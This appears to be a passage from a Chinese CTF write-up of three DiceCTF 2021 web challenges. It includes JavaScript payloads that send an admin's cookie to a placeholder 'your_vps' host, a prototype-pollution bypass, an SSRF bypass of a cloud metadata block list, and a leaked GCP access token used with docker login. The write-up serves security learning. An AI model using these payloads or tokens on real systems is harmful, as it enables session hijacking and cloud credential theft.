    setTimeout(function () {
      var data = `"".constructor.constructor('var opener = window.open("https://web-ide.dicec.tf/ide/");setTimeout(function(){window.location = "https://your_vps/?a="+ encodeURIComponent(opener.document.cookie);},1000)')()`;
      opener.postMessage(data, "*");
    }, 1000);
其中`setTimeout`是为了等页面加载出来，比较懒的做法。直接在你的 vps 上放置含有如上 js 代码的 html 页面，让 admin
访问你的页面，就可以收到 cookie 了。
这里如果你直接用 chrome 来试的话会因为没有用户交互被直接拦截弹窗，但是我试的时候用的是 burp 自带的 chromium
，而且题目可能也没处理好弹窗限制，导致了这个非预期。
###  Author Intended Solution
其中这个题的预期解是使用 ServiceWorker ，虽然存储路由可以存储任意 javascript 代码但是因为 content-type
没办法执行，我们可以利用 service-worker 将其注册成为一个 sw ，然后可以通过拦截 fetch 请求来实现我们将 cookie
外带的一个效果，具体代码如下
    f.addEventListener('load', () => {
      f.contentWindow.postMessage(`[].slice.constructor('return this')().fetch("https://web-ide.dicec.tf/ide/save", {
      "headers": {
        "content-type": "application/javascript",
      },
      "body": "self.addEventListener('fetch', e=>{if (e.request.method != 'GET') {return;} e.respondWith(new Response('navigator.sendBeacon(\\\\\\\\'your_vps\\\\\\\\', document.cookie)',{headers:{\\\\'content-type\\\\':\\\\'text/html\\\\'}}));});",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    }).then(response=>response.text()).then(path=>{[].slice.constructor('return this')().navigator.serviceWorker.register('/ide/saves/'+path, {scope: '/ide/saves/'})});`, '*');
    setTimeout(() => {location = 'https://web-ide.dicec.tf/ide/saves/'}, 1000)
    })
PS:注意 body 当中反斜杠转义的个数，盲猜安全客的转义机制会把反斜杠给弄掉几个…
## Build a Better Panel
###  Description
BAP wasn’t secure enough. Now the admin is a bit smarter, see if you can still
get the flag! If you experience any issues, send it [here](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=build-a-better-panel)
NOTE: The admin will only visit sites that match the following regex
`^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$`
Site: [build-a-better-panel.dicec.tf](https://build-a-better-panel.dicec.tf/)
附件地址：
###  Solution
按照上文对第一个版本的做法，这题增加了两个限制，一个就是 sameSite 改成了 strict ，还有一个就是只允许 admin 访问 /create
路由了。
    app.get('/create', (req, res) => {
        const cookies = req.cookies;
        const queryParams = req.query;
        if(!cookies['panelId']){
            const newPanelId = queryParams['debugid'] || uuidv4();
            res.cookie('panelId', newPanelId, {maxage: 10800, httponly: true, sameSite: 'strict'});
        }
        res.redirect('/panel/');
    });
    app.get('/panel/', (req, res) => {
        const cookies = req.cookies;
        if(cookies['panelId']){
            res.render('pages/panel');
        }else{
            res.redirect('/');
        }
    });
/create 路由会根据我们传入的 debugid 跳转到对应的 panel 界面，panel 界面主要根据对应的 id 来构造页面内容，其中主要的 js
代码如下：
    const mergableTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];
    const safeDeepMerge = (target, source) => {
        for (const key in source) {
            if(!mergableTypes.includes(typeof source[key]) && !mergableTypes.includes(typeof target[key])){
                if(key !== '__proto__'){
                    safeDeepMerge(target[key], source[key]);
                }
            }else{
                target[key] = source[key];
            }
        }
    }
    const displayWidgets = async () => {
        const userWidgets = await (await fetch('/panel/widgets', {method: 'post', credentials: 'same-origin'})).json();
        let toDisplayWidgets = {'welcome back to build a panel!': {'type': 'welcome'}};
        safeDeepMerge(toDisplayWidgets, userWidgets);
        const timeData = await (await fetch('/status/time')).json();
        const weatherData = await (await fetch('/status/weather')).json();
        const welcomeData = await (await fetch('/status/welcome')).json();
        const widgetData = {'time': timeData['data'], 'weather': weatherData['data'], 'welcome': welcomeData['data']};
        const widgetPanel = document.getElementById('widget-panel');
        for(let name of Object.keys(toDisplayWidgets)){
            const widgetType = toDisplayWidgets[name]['type'];
            const panel = document.createElement('div');
            panel.className = 'panel panel-default';
            const panelTitle = document.createElement('h5');
            panelTitle.className = 'panel-heading';
            panelTitle.textContent = name;
            const panelData = document.createElement('p');
            panelData.className = 'panel-body';
            if(widgetData[widgetType]){
                panelData.textContent = widgetData[widgetType];
            }else{
                panelData.textContent = 'The widget type does not exist, make sure you spelled it right.';
            }
            panel.appendChild(panelTitle);
            panel.appendChild(panelData);
            widgetPanel.appendChild(panel);
        }
    };
    window.onload = (_event) => {
        displayWidgets();
    };
很明显的原型链污染绕过，但是我们目前还不知道污染什么，我们再看回 panel 界面，发现有一行比较突兀的代码：
随便搜搜我们可以在 [Embedly Cards](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md) 找到相关原型链污染的资料：
      XSS Challenge
所以我们就可以知道，我们需要污染`onload`属性就能有一个 XSS
了，问题就来到了如果绕过对于`__proto__`关键字的绕过，这里我们可以看到通过`constructor.protoype`来绕过这个限制，例如：
    Object.__proto__ === Object.constructor.prototype    //true
我们可以做一个简单的测试：
成功触发弹窗，虽然测试成功了，但是我们仍然还要注意到题目还有 CSP 的存在…
    res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;");
    res.setHeader("X-Frame-Options", "DENY");
基本上我们不可能直接执行 js 代码，除非在指定的 uri 里面有什么便捷的操作，然而我们再回顾一下怎么之前是获取 flag 的？是让 admin
帮我们执行一个请求而已，并不需要我们弄到 admin 的 cookie
，所以现在又清晰了一点，如果只需要发一个请求，我们是不是可以使用`srcdoc`来帮助我们直接放一个可以做请求的标签就可以了呢？因为我们要请求的 url
也在自己域名内，所以也可以满足 CSP 的要求。所以我们可以弄一个 script 标签，其 src 指向我们
    JSON.stringify({
      widgetName: 'constructor',
      widgetData: JSON.stringify({
        prototype: {
          srcdoc: ``
        }
      }) 
    })
    //{"widgetName":"constructor","widgetData":"{\"prototype\":{\"srcdoc\":\"\"}}"}
把上述 json 通过 /panel/add 增加到对应 panelId 内容中，然后把 panelId 对应的 URL 发给 admin ，然后到
/panel/widgets 路由带着 cookie 访问即可拿到 flag
## Watermark as a Service
###  Description
My new Watermark as a Service (WaaS) startup just started using the cloud.
It’s so cool!
[waas.dicec.tf](https://waas.dicec.tf/)
附件：
    const dns = require("dns");
    const express = require("express");
    const ip = require("ip");
    const path = require("path");
    const puppeteer = require("puppeteer");
    const sharp = require("sharp");
    const app = express();
    const ALLOWED_PROTOCOLS = ["http:", "https:"];
    const BLOCKED_HOSTS = ["metadata.google.internal", "169.254.169.254"];
    app.get("/", (req, res) => {
      res.sendFile(path.join(__dirname + "/public/index.html"));
    });
    app.get("/snap", async (req, res) => {
      const url = decodeURIComponent(req.query.url);
      if (!url) {
        res.sendStatus(400);
      }
      let urlObj;
      try {
        urlObj = new URL(url);
      } catch {
        res.sendStatus(400);
      }
      const hostname = urlObj.hostname;
      if (ip.isPrivate(hostname)) {
        res.sendStatus(400);
      }
      if (BLOCKED_HOSTS.some((blockedHost) => hostname.includes(blockedHost))) {
        res.sendStatus(400);
      }
      const protocol = urlObj.protocol;
      if (
        !ALLOWED_PROTOCOLS.some((allowedProtocol) =>
          protocol.includes(allowedProtocol)
        )
      ) {
        res.sendStatus(400);
      }
      dns.resolve4(hostname, function (err, addresses) {
        if (err) {
          res.sendStatus(400);
        }
        addresses.forEach(function (address) {
          if (address === "169.254.169.254") {
            res.sendStatus(400);
          }
        });
      });
      const browser = await puppeteer.launch({
        args: ["--no-sandbox", "--disable-setuid-sandbox"],
      });
      try {
        const page = await browser.newPage();
        await page.goto(url);
        const imageBuffer = await page.screenshot();
        sharp(imageBuffer)
          .composite([{ input: "dicectf.png", gravity: "southeast" }])
          .toBuffer()
          .then((outputBuffer) => {
            res.status(200).contentType("image/png").send(outputBuffer);
          });
      } catch (error) {
        console.error(error);
      } finally {
        await browser.close();
      }
    });
    app.listen(3000, () => {
      console.log("Listening on 3000");
    });
    console.log(process.env.FLAG);
###  Solution
题目意图比较明显，就是需要让我们通过 SSRF 获取 Google Cloud 相关的信息，前面的过滤措施也不是什么新的考点，我们可以通过查找一些 SSRF
绕过姿势找到 302 跳转的绕过形式，我们可以使用 [bit.ly](https://bitly.com/)
提供的短链接服务方便地构造我们的跳转地址，例如我们先按照老规矩，先看看
 能不能成功
虽然不能访问，但是至少说明我们已经绕过了之前的一些限制，成功访问到了 Google Cloud 内部的 API
。我们仔细看错误提示，缺少一个`Metadata-Flavor: Google`请求头，我们可以考虑 CRLF 注入什么的，有点类似 BalsnCTF
2020 tpc 的那道题目，可是这里我们并没有找到一个 CRLF 注入点，所以我们需要找其他的方法。
查看其他选手的做法是通过找到了一个 v1beta1 的这么一个 API ，我们可以访问
得到一些信息
我们可以用一些 OCR 服务帮我们识别图片当中的文字：
    {"attributes": {"gce-container-declaration":"spec:\n containers: \n - name: waas\n image:
    gcr.io/dicegang-waas/waas\n stdin: false\n tty: false\n restartPolicy: Always\n\n# This
    container declaration format is not public API and may change without notice. Please\n# use gcloud
    command-line tool or Google Cloud Console to run Containers on Google Compute Engine.", “google-    logging-enabled":"true"}, "description":"", "disks":
    [{"deviceName": "waas", “index":0, “interface”: "SCSI", "mode": "READ_WRITE", "type": "PERSISTENT"}], "guestA
    ttributes":{}, "hostname": "waas.us-easti-b.c.dicegang-    waas.internal", "id":2549341475975469686, "image" : "projects/cos-cloud/global/images/cos-stable-85-    13310-1209-7", "licenses": [{"id" : "6880041984996540132"}, {"id" :"166739712233658766"},
    {"id":"1001010"}], “machineType": "projects/608525903049/machineTypes/e2-    micro", “maintenanceEvent": "NONE", “name":"waas", "networkInterfaces":[{"accessConfigs":
    [{"externalIp":"35.229.111.15", "type": "ONE_TO_ONE_NAT"}], “dnsServers":
    ("169.254.169.254"), "forwardedIps":[], "gateway": "10.142.0.1", "ip":"10.142.0.2", "ipAliases":
    [], "mac": "42:01: 0a: 8e: 00:02", "mtu": 1460, "network": "projects/608525903049/networks/default", "subnetma
    sk":"255.255. 240.0", "targetInstanceIps":[]}], "preempted": "FALSE", "scheduling":
    {"automaticRestart": "TRUE", “onHostMaintenance" : "MIGRATE", "preemptible":"FALSE"}, "serviceAccounts":
    {"default": {"aliases":["default"], "email": "waas -155@dicegang-waas .iam.gserviceaccount.com", "scopes":
    ["https: //www.googleapis.com/auth/cloud-platform"]}, "waas -155@dicegang-    waas.iam.gserviceaccount.com": {"aliases":["default"], "email": "waas-155@dicegang -    waas.iam.gserviceaccount.com", "scopes": ["https: //www.googleapis.com/auth/cloud-platform"]}}, "tags":
    ["http-server", "https-server"], "zone": "projects/608525903049/zones/us-east1-b"}
从上面的内容我们大概可以看到 Google Cloud 上托管了一个 docker 镜像，位于`gcr.io/dicegang-waas/waas`，我们可以通过以下方式获取到对应的
Token：
这里建议找个容易识别的 Token ，因为 OCR 只能做到大部分准确，剩下的还是得自己手动弄一遍，中间有点的圈是零0，字母 l 跟数字 1 得要会区分…
    {"access_token":"ya29.c.Ko0B8gfnSKSLRHwb6qsNMrDc7577bpZ-Hl99GNXP6i-YYp1GqZmibofKkJHYQRh8NAVnqTxLl7XNUQI7Zwl6PQJY-FYq5IpVMRfr3KwixAKjxhWchqTleR_3sXtjaIaG64wwW5u6uxwg3WCoBi-NklStqkoytTGAZMtrv4yLDUB3WeUzGqs2uGtMbvuyPbG5", “expires_in":3292, "token_type":"Bearer"}
最后通过这个 token 用 docker 登陆
    docker login -u oauth2accesstoken -p "ya29.c.Ko0B8gfnSKSLRHwb6qsNMrDc7577bpZ-Hl99GNXP6i-YYp1GqZmibofKkJHYQRh8NAVnqTxLl7XNUQI7Zwl6PQJY-FYq5IpVMRfr3KwixAKjxhWchqTleR_3sXtjaIaG64wwW5u6uxwg3WCoBi-NklStqkoytTGAZMtrv4yLDUB3WeUzGqs2uGtMbvuyPbG5" gcr.io
直接拉下镜像运行就可以看到打印出来的 flag 了…
因为国内复杂的网络环境，我们最好找个国外的机器做
## Summary
当时比赛的时候并没有弄出来全部题目，只是做了几个，复现的时候也学到了很多，尤其是最后一个题目，看得眼都要瞎了，也倡议大家在弄验证码的时候，不要使用
Oo0Ll1Ii 等容易在字体上产生混淆的字符集生成验证码，会极其反人类，最后还是要膜一下我猫哥，你猫哥永远是你猫哥，其他的就不谈了。